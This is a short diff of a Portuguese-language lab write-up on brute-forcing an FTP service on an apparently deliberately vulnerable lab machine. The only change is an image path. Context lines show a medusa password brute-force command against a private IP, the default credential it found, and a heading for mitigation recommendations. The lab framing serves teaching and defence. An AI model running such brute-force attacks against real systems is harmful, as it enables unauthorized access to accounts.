@@ -44,7 +44,7 @@ medusa -h 192.168.56.20 -U attacks/wordlist-ftp.txt -P attacks/wordlist-ftp.txt 
 Resultado:
 
 Credencial Encontrada: msfadmin:msfadmin
-  <img src="images/ataque.png" alt="VirtualBox_kali-linux-2024.4-virtualbox-amd64_25_11_2025_18_31_23.png" />    
+  <img src="VirtualBox_kali-linux-2024.4-virtualbox-amd64_25_11_2025_18_31_23.png" alt="VirtualBox_kali-linux-2024.4-virtualbox-amd64_25_11_2025_18_31_23.png" />    
 
   3. 🛡️ Recomendações de Mitigação
 Para cada cenário de ataque, as seguintes medidas de segurança são recomendadas:
